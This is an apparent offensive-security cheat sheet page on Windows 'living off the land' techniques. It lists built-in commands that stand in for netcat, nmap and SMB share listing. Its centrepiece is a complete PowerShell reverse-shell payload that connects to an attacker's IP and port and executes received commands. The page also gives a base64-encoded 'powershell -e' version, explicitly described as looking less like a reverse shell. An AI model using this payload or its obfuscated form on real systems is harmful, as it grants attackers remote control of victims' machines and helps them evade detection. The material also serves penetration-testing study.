---
description: >-
  Using Windows programs to perform all kinds of actions, without requiring
  extra software
---

# Living Off The Land (LOLBAS)

{% embed url="https://lolbas-project.github.io/" %}
A list of **builtin** Windows binaries and commands that can _download_, _execute_ and do other interesting things
{% endembed %}

## Windows actions

Some common commands you'll find yourself using in many situations. When a windows machine is compromised you must sometimes live with the binaries that it has, so these code snippets contain the Windows-equivalent to some Linux utilities:

{% code title="nc -v $IP $PORT" %}
```powershell
Test-NetConnection -Port 22 10.10.10.10
```
{% endcode %}

{% code title="nmap -p $PORTS $IP" overflow="wrap" %}
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null
```
{% endcode %}

&#x20;<mark style="color:blue;">**↳**</mark> The above loop is **very slow** because it goes through ports one by one with a timeout

{% code title="SMB: List shares on dc01" %}
```powershell
net view \\dc01 /all
```
{% endcode %}

{% code title="Interactive netcat" %}
```
dism /online /Enable-Feature /FeatureName:TelnetClient

telnet 192.168.50.8 25
```
{% endcode %}

&#x20;<mark style="color:blue;">**↳**</mark> This feature needs to be already enabled, or enabled by you as an administrator

### Powershell Reverse Shell

A reverse shell sends a connection back to an attacker, from which they can execute commands on the target interactively. In PowerShell, this can be done by creating a TCP socket, receiving a command, and then sending back the output.&#x20;

A short implementation of this is [revshells.com - PowerShell #3 (Base64)](https://www.revshells.com/). It uses the following payload and replaces the `$IP` and `$PORT` with your server:

{% code title="Payload" overflow="wrap" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

[This CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=Encode\_text\('UTF-16LE%20\(1200\)'\)To\_Base64\('A-Za-z0-9%2B/%3D'\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'powershell%20-e%20$%26',false,false,false,true\)) can be used to convert the above command into an encoded payload, looking way less like a reverse shell and containing fewer special characters:

{% code title="Encoded Payload" %}
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAJABJAFAAIgAsACQAUABPAFIAVAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```
{% endcode %}
